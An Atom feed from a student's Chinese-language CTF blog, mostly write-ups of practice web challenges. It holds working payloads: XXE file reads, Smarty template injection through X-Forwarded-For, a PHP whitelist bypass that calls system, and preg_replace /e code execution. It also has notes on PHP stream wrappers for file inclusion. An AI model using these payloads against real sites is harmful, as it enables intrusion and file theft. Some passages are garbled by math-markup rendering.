<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ev11ccaatt.github.io</id>
    <title>ev11ccaatt</title>
    <updated>2021-03-25T16:03:24.241Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ev11ccaatt.github.io"/>
    <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
    <subtitle>人菜多学</subtitle>
    <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
    <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, ev11ccaatt</rights>
    <entry>
        <title type="html"><![CDATA[[XMAN2018排位赛]通行证]]></title>
        <id>https://ev11ccaatt.github.io/post/xman2018-pai-wei-sai-tong-xing-zheng</id>
        <link href="https://ev11ccaatt.github.io/post/xman2018-pai-wei-sai-tong-xing-zheng">
        </link>
        <updated>2021-03-25T15:43:36.000Z</updated>
        <content type="html"><![CDATA[<p>这道题是水的一题</p>
<p>这两天身体不舒服，水一下。</p>
<p>下载</p>
<pre><code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==
</code></pre>
<p>base64解密</p>
<pre><code>kanbbrgghjl{zb____}vtlaln
</code></pre>
<p>这里卡了一会，以为要翻转，但翻过来明显不对劲，考虑下栅栏.</p>
<p>在cyberchef试了下，竟然不是解密而是加密，key为7.</p>
<pre><code>kzna{blnl_abj_lbh_trg_vg}
</code></pre>
<p>最后一步很明显了凯撒移位。（https://planetcalc.com/1434/）</p>
<pre><code>ROT13	xman{oyay_now_you_get_it}
</code></pre>
<p>收工，睡觉.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[CSAWQual 2019]Web_Unagi]]></title>
        <id>https://ev11ccaatt.github.io/post/csawqual-2019web_unagi</id>
        <link href="https://ev11ccaatt.github.io/post/csawqual-2019web_unagi">
        </link>
        <updated>2021-03-24T10:30:06.000Z</updated>
        <content type="html"><![CDATA[<p>进去先看几个网页，发现flag在/flag</p>
<p>然后upload页面存在上传。</p>
<p>细看有个here的超链接。</p>
<p>点进去一看貌似是xxe执行命令.</p>
<pre><code>&lt;?xml version='1.0'?&gt;
&lt;!DOCTYPE users [
&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
&lt;users&gt;
    &lt;user&gt;
        &lt;username&gt;bob&lt;/username&gt;
        &lt;password&gt;passwd2&lt;/password&gt;
        &lt;name&gt; Bob&lt;/name&gt;
        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  
        &lt;group&gt;CSAW2019&lt;/group&gt;
        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;
    &lt;/user&gt;
&lt;/users&gt;
</code></pre>
<p>构造尝试读取.</p>
<p>一上传发现被ban了，考虑转换编码来绕过。 utf-8 -&gt; utf-16.</p>
<p>成功读取.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[友链]]></title>
        <id>https://ev11ccaatt.github.io/post/you-lian</id>
        <link href="https://ev11ccaatt.github.io/post/you-lian">
        </link>
        <updated>2021-03-23T10:31:39.000Z</updated>
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_51868336">77pray</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[CISCN2019 华东南赛区]Web11]]></title>
        <id>https://ev11ccaatt.github.io/post/ciscn2019-hua-dong-nan-sai-qu-web11</id>
        <link href="https://ev11ccaatt.github.io/post/ciscn2019-hua-dong-nan-sai-qu-web11">
        </link>
        <updated>2021-03-23T09:58:56.000Z</updated>
        <content type="html"><![CDATA[<p>进去先看源代码发现一句</p>
<pre><code> &lt;p style=&quot;text-align:center;font-size:14px;&quot;&gt;Build With Smarty !&lt;/p&gt;
</code></pre>
<p>那么就要测试一下注入点，题目一共提供了三个网址原网址,/api,/xff.</p>
<p>那么接下来寻找注入点。</p>
<p>使用tqlmap对三个地址进行测试，均未爆出注入点。</p>
<p>那么再看看题目，题目中提到X-Forwarded-For，那么注入点会不会存在在这里。</p>
<p>测试一手XFF={if phpinfo()}{/if} 不用{php}是因为smarty3已废弃{php}标签。</p>
<p>三个网址均有正确的回显，那么对其继续注入.</p>
<p>将XFF改为{if system(&quot;ls /&quot;)}{/if}进行测试，只有/api和/xff有正确回显。</p>
<p>那么读取/flag 即可获得flag.</p>
<p>这里有多种方法</p>
<p>system执行系统命令；show_source；readfile；等.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[CISCN 2019 初赛]Love Math]]></title>
        <id>https://ev11ccaatt.github.io/post/ciscn-2019-chu-sai-love-math</id>
        <link href="https://ev11ccaatt.github.io/post/ciscn-2019-chu-sai-love-math">
        </link>
        <updated>2021-03-22T07:43:58.000Z</updated>
        <content type="html"><![CDATA[<pre><code>&lt;?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) &gt;= 80) {
        die(&quot;太长了不会算&quot;);
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '&quot;', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
</code></pre>
<p>明显要构造类似于c=system(cat /flag)的payload。</p>
<p>而system不在白名单.可以利用动态函数的性质,即c=(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>[</mo><mi>a</mi><mo>]</mo><mo>)</mo><mo>(</mo></mrow><annotation encoding="application/x-tex">_GET[a])(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathdefault">a</span><span class="mclose">]</span><span class="mclose">)</span><span class="mopen">(</span></span></span></span>_GET[b])</p>
<p>那么就需要构造出_GET.</p>
<p>先使用hex2bin（十六进制转ascii）得到5f474554,而这个字符串无法过jiance,需要再次加密，可以使用dechex（将10进制转化为十六进制)得到1598506324.</p>
<p>但hex2bin未在白名单.可以采用base_convert()进行进制的转换.得到base_convert(37907361743,10,36).</p>
<p>因为c有长度限制，则变量名要采用在白名单中较短的,此处采用pi,后面的变量名依次按长度选取.<br>
得到payload.</p>
<pre><code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flag
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[php伪协议总结]]></title>
        <id>https://ev11ccaatt.github.io/post/php-wei-xie-yi-zong-jie</id>
        <link href="https://ev11ccaatt.github.io/post/php-wei-xie-yi-zong-jie">
        </link>
        <updated>2021-03-21T09:24:53.000Z</updated>
        <content type="html"><![CDATA[<p>最近做了几道题其中都有伪协议的出现,那么不如趁此机会，做个伪协议的总结.<br>
环境：</p>
<h2>0x00</h2>
version=7.4
<p>php.ini:</p>
<p>allow_url_fopen: on 默认开启，能够访问url对象文件.</p>
<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等.</p>
<h2>0x01</h2>
<h3>【file://协议】</h3>
<p>php.ini:</p>
<p>allow_url_fopen: off/on</p>
<p>allow_url_include：off/on</p>
<p>用于访问本地文件系统，常用于读取文件.</p>
<h2>0x02</h2>
<h3>【php://协议】</h3>
<p>php.ini:</p>
<p>allow_url_fopen= off.</p>
<p>仅php://input,php://stdin,php://memory,php://temp不需要开启allow_url_inclde.</p>
<p>php://用于访问输入/输出流(I/O streams),比赛中常用的是</p>
<p>php://filter(读取源码，常配合转换过滤器((<a href="https://www.php.net/manual/zh/filters.convert.php">Conversion Filters</a>,因为若直接读取会执行代码)</p>
<p>php://input,访问请求的原始数据的只读流，将post中的数据作为php代码执行.</p>
<h3>【zip://, bzip2://, zlib://协议】</h3>
<p>PHP.ini：</p>
<p>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</p>
<p>allow_url_fopen ：off/on</p>
<p>allow_url_include：off/on</p>
<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<p>【zip://协议】</p>
<p>使用方法：</p>
<p>zip://archive.zip#dir/file.txt</p>
<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<p>eg:file=zip://etc/1.zip%23code.txt</p>
<p>将要执行的php代码文件重命名为.txt ，然后打包成zip，若能直接上传，则直接上传，若不能则改为jpg。</p>
<p>【bzip2://协议】</p>
<p>eg:file=compress.bzip2://etc/1.jpg</p>
<p>【zlib://协议】</p>
<p>eg:file=compress.zlib://etc/1.jpg</p>
<h3>【data://协议】</h3>
<p>PHP.ini：</p>
<p>allow_url_fopen ：on</p>
<p>allow_url_include：on</p>
<p>eg:data://text/plain,&lt;?php phpinfo()&gt;</p>
<p>data://text/plain,base64,PD9waHAgcGhwaW5mbygpPz4=</p>
<p>data:text/plain,&lt;?php phpinfo()&gt;</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[About me]]></title>
        <id>https://ev11ccaatt.github.io/post/about-me</id>
        <link href="https://ev11ccaatt.github.io/post/about-me">
        </link>
        <updated>2021-03-21T05:32:28.000Z</updated>
        <content type="html"><![CDATA[<p>西游挨踢大一学生(CUIT)<br>
<s>web</s>misc手<br>
<s>MTX</s><br>
个人联系方式<br>
QQ:2861383861<br>
提供TG，私聊请.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF2020]ZJCTF，不过如此]]></title>
        <id>https://ev11ccaatt.github.io/post/bjdctf2020zjctfbu-guo-ru-ci</id>
        <link href="https://ev11ccaatt.github.io/post/bjdctf2020zjctfbu-guo-ru-ci">
        </link>
        <updated>2021-03-21T05:16:20.000Z</updated>
        <content type="html"><![CDATA[<pre><code>&lt;?php

error_reporting(0);
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;I have a dream&quot;)){
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file)){
        die(&quot;Not now!&quot;);
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?&gt;
</code></pre>
<p>通过读入text和file来完成验证,由于对text采取的是file_get_contents,则需利用data:数据流封装器.</p>
<p>无法直接读flag.php，但题目给了下一步的文件next.php。可用php://filter/convert.base64-encode/resource=next.php.</p>
<p>读取解密后.</p>
<pre><code>&lt;?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower(&quot;\\1&quot;)',
        $str
    );
}


foreach($_GET as $re =&gt; $str) {
    echo complex($re, $str). &quot;\n&quot;;
}

function getFlag(){
	@eval($_GET['cmd']);
}

</code></pre>
<p>这里利用了preg_replace /e模式下的代码执行问题.([深入研究preg_replace与代码执行](<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a>))</p>
<p>传入\S*=${getflag()}&amp;cmd=system('cat /flag.txt');(注意闭合)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ [BJDCTF2020]Mark loves cat wp]]></title>
        <id>https://ev11ccaatt.github.io/post/bjdctf2020mark-loves-cat-wp</id>
        <link href="https://ev11ccaatt.github.io/post/bjdctf2020mark-loves-cat-wp">
        </link>
        <updated>2021-03-20T14:42:03.000Z</updated>
        <content type="html"><![CDATA[<p>进来先浏览网页发现下方有联系方式，和留言框。可能是社工或者xss。</p>
<p>但还是dirsearch搜索，这里用的py3版本的dirsearh。</p>
<p>获得index.php。</p>
<pre><code>&lt;?php

include 'flag.php';

$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = 'yds';

foreach($_POST as $x =&gt; $y){
    $$x = $y;
}

foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}

foreach($_GET as $x =&gt; $y){
    if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo &quot;the flag is: &quot;.$flag;
</code></pre>
<p>​	先说下foreach语法.</p>
<p>eg: foreach ($_Post as $x =&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>)</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">访</mi><mi mathvariant="normal">问</mi><mi mathvariant="normal">是</mi><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">个</mi><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">;</mo><mi mathvariant="normal">则</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">时</mi></mrow><annotation encoding="application/x-tex">y)，访问是post个 a,b;则此时</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span></span></span></span>x=a,$y=b;</p>
<p>然后$$x=$y可以看成 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo></mrow><annotation encoding="application/x-tex">(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span></span></span></span>x) = <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">即</mi><mi mathvariant="normal">若</mi></mrow><annotation encoding="application/x-tex">y ，即若</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">若</span></span></span></span>x的值a，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">a=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>y。可以通过此处来进行变量覆盖.</p>
<p>该源码存在四处输出，来依次测试。</p>
<pre><code>if($_GET['flag'] === $x &amp;&amp; $x !== 'flag')
</code></pre>
<p>没想出利用方法,当 传入flag=flag时满足一半条件，无法绕过.</p>
<pre><code>if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))
</code></pre>
<p>此处易满足条件，那么只需要覆盖<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mi>d</mi><mi>s</mi><mi mathvariant="normal">即</mi><mi mathvariant="normal">可</mi><mo separator="true">,</mo><mi mathvariant="normal">即</mi><mi mathvariant="normal">使</mi></mrow><annotation encoding="application/x-tex">yds即可,即使</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">d</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">使</span></span></span></span>yds=$flag; 因为前后都要覆盖则，通过</p>
<pre><code>foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}
</code></pre>
<p>来覆盖,以get传入yds=flag即可。</p>
<pre><code>if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
</code></pre>
<p>要覆盖$is,即替换为is=flag,同时post或get进个flag=flag.</p>
<pre><code>echo &quot;the flag is: &quot;.$flag;
</code></pre>
<p>最好绕过,但需要通过一个变量进行中转来绕过第2,3个if.</p>
]]></content>
    </entry>
</feed>